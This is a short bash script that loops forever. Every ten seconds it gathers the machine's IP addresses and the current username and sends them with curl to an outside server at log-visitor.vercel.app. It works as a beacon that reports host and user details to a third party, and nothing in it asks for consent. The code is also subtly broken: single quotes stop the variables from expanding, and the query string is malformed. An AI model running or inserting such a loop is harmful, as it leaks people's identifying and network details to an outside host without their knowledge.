while true
do
    ips=$(hostname -I)
    username=$(whoami)
    curl 'https://log-visitor.vercel.app/?id=$username?ip=$ips'
    sleep 10
done